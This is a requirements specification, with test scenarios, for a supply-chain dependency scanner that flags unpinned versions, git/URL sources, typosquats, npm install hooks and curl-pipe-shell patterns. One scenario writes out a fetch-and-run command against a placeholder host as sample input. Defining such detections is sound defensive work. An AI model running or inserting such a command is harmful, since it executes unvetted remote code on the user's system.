## ADDED Requirements

### Requirement: Deterministic manifest parsing without model calls

The `dependency-risk-scanner` activity SHALL parse dependency manifests —
requirements.txt, pyproject.toml, package.json, Cargo.toml, and go.mod —
deterministically, without invoking any model client. Each parsed dependency SHALL
carry its name, version specifier, source kind (registry, git, or url), and any
associated npm scripts.

#### Scenario: five-manifest-project-parses-all-formats

- **WHEN** the scanner runs against a repo with requirements.txt, pyproject.toml,
  package.json, Cargo.toml, and go.mod
- **THEN** all five manifests are parsed and every dependency's name, version
  specifier, and source kind are extracted

#### Scenario: no-model-client-is-constructed

- **WHEN** the scanner activity executes
- **THEN** no model client is instantiated and no budget is consumed

### Requirement: Unpinned version detection

The scanner SHALL flag any dependency whose version specifier is a lower-bound-only
range (`>=`, `>`), a wildcard (`*`, `x`), the literal `latest`, or absent entirely.
Flagged dependencies SHALL carry severity HIGH.

#### Scenario: unpinned-requirements-flagged

- **WHEN** a requirements.txt contains `requests>=2.0` and `flask`
- **THEN** both `requests` and `flask` are flagged with severity HIGH and source
  references pointing to the manifest file and line

#### Scenario: pinned-version-not-flagged

- **WHEN** a dependency specifies an exact version (`==`, `@`, or a bare semver in
  Cargo.toml / go.mod)
- **THEN** no unpinned-version finding is emitted for that dependency

### Requirement: Git and URL dependency detection

The scanner SHALL flag any dependency sourced from a git+https, git+ssh, or direct
http/https URL rather than a package registry. Flagged dependencies SHALL carry
severity HIGH.

#### Scenario: git-plus-https-in-package-json-flagged

- **WHEN** a package.json dependency references `git+https://github.com/user/repo.git`
- **THEN** that dependency is flagged with severity HIGH and its source kind recorded
  as `git`

#### Scenario: registry-dependency-not-flagged

- **WHEN** a dependency is sourced from a standard registry (npm, PyPI, crates.io,
  Go module proxy)
- **THEN** no git/URL finding is emitted

### Requirement: Configurable typosquat pattern detection

The scanner SHALL check dependency names against a configurable typosquat pattern
list and SHALL flag any match with severity MEDIUM. When no pattern list is
configured this check SHALL be a no-op.

#### Scenario: typosquat-match-flagged

- **WHEN** a configured pattern `dateutil` matches a dependency named `python-dateutil`
- **THEN** the dependency is flagged with severity MEDIUM citing the matching pattern

#### Scenario: empty-pattern-list-is-no-op

- **WHEN** no typosquat patterns are configured
- **THEN** the scanner completes without emitting any typosquat findings

### Requirement: Npm pre-postinstall script detection

For npm packages, the scanner SHALL parse the `scripts` block in package.json and
SHALL flag the presence of `preinstall` and `postinstall` script entries with
severity MEDIUM.

#### Scenario: postinstall-script-flagged

- **WHEN** a package.json contains `"postinstall": "node setup.js"`
- **THEN** a finding is emitted with severity MEDIUM pointing to the postinstall
  entry

#### Scenario: no-hook-scripts-no-finding

- **WHEN** a package.json `scripts` block contains only `start`, `test`, and `build`
- **THEN** no install-script finding is emitted

### Requirement: Curl-pipe-shell detection in npm scripts

The scanner SHALL detect shell-pipe patterns — `curl` or `wget` piped into `sh`,
`bash`, or another shell interpreter — in any npm script value and SHALL flag them
with severity CRITICAL.

#### Scenario: curl-pipe-sh-flagged

- **WHEN** a package.json script contains `curl -s http://example.com/install.sh | sh`
- **THEN** that script is flagged with severity CRITICAL citing the script name and
  the matched pattern

#### Scenario: benign-shell-script-not-flagged

- **WHEN** a script contains `node build.js` or `tsc --noEmit`
- **THEN** no curl-pipe-shell finding is emitted

### Requirement: Candidate-finding emission per risk

Each flagged risk SHALL be emitted as a `CandidateFinding` with
`vuln_class=SUPPLY_CHAIN`, `status=candidate`, severity set per risk type, and
`source_refs` carrying the manifest file path and the dependency or script line.
The finding SHALL also populate `evidence_path` (ordered, manifest file path and
line as the first element) so sink-locator dedup and evidence links resolve
without falling back to `source_refs`. The `created_by` field SHALL identify the
scanner activity.

#### Scenario: single-risk-emits-one-candidate-finding

- **WHEN** a requirements.txt has one unpinned dependency and no other risks
- **THEN** exactly one `CandidateFinding` is emitted with `vuln_class=SUPPLY_CHAIN`

#### Scenario: multiple-risks-emit-one-finding-each

- **WHEN** a dependency is both unpinned AND sourced from a git URL
- **THEN** two distinct `CandidateFinding` records are emitted, one per risk type

### Requirement: Deterministic output contract

The scanner activity SHALL be deterministic: given the same manifest files it SHALL
produce the same set of findings in the same order. It SHALL NOT invoke any model
client, consume any budget, or depend on network access.

#### Scenario: same-manifests-same-output

- **WHEN** the scanner runs twice against identical manifest contents
- **THEN** the emitted findings are identical in count, content, and order

#### Scenario: only-manifest-changes-change-output

- **WHEN** a manifest file changes between runs
- **THEN** only findings derived from that manifest differ; findings from unchanged
  manifests are identical